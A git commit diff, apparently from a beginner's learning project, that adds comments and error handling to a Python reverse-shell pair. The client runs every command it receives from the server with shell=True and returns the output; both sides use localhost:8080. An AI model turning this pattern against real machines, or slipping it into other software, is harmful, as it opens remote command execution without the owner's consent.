ba9a3e63d2d7974767f76cc6c10d8d8992627c38
andrenascimentobarbosa <andrebarbosa2024@gmail.com>
2024-05-08 17:37:07 -0300

    remote shell working

--- remote_shell/client.py
+++ remote_shell/client.py
@@ -1,14 +1,18 @@
 #!/usr/bin/python3
 
+# import modules
 import socket
 import subprocess
 
+# define remote host and port
 host = '127.0.0.1'
 port = 8080
 
+# create socket object
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((host, port))
 
+# receive and decode commands from the server
 while True:
     comm = client.recv(1024).decode()
     if not comm:
@@ -16,7 +20,13 @@ while True:
     elif comm == '':
         pass
     else:
-        output = subprocess.check_output(comm, stderr=subprocess.STDOUT, text=True, shell=True)
-        client.send(output.encode())
+        try:
+            # excute command sending the output
+            output = subprocess.check_output(comm, stderr=subprocess.STDOUT, text=True, shell=True)
+            client.send(output.encode())
+        except subprocess.CalledProcessError as e:
+            error_msg = f'Error excuting command: {comm}\n{e}'
+            client.send(error_msg.encode())
 
+# close the connection.
 client.close()
--- remote_shell/server.py
+++ remote_shell/server.py
@@ -1,25 +1,44 @@
+#!/usr/bin/python3 
+
+# import socket
 import socket
 
+# define host and port
 host = '127.0.0.1'
 port = 8080
+
+# create socket object (server)
+# bind server to host and port
+# listen for connections 
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((host, port))
 server.listen(1)
 print('listening on ', port)
 
+# accept connection from client
 client, addr = server.accept()
 print('connection established with ', addr)
 
+# shell session
 while True:
-    comm = input('shell# ').strip().lower()
+
+    # command input
+    try:
+        comm = input('shell# ').strip().lower()
+    except KeyboardInterrupt:
+        print('try the command "close" to end the connection.')
     if comm == 'close':
         break
     elif comm == '':
         pass
     else:
-        server.send(comm.encode())
-        output = server.recv(1024).decode()
+        
+        # encode and send command
+        # receive and decode output
+        client.send(comm.encode())
+        output = client.recv(1024).decode()
         print(output)
 
+# close the connetion.
 server.close()
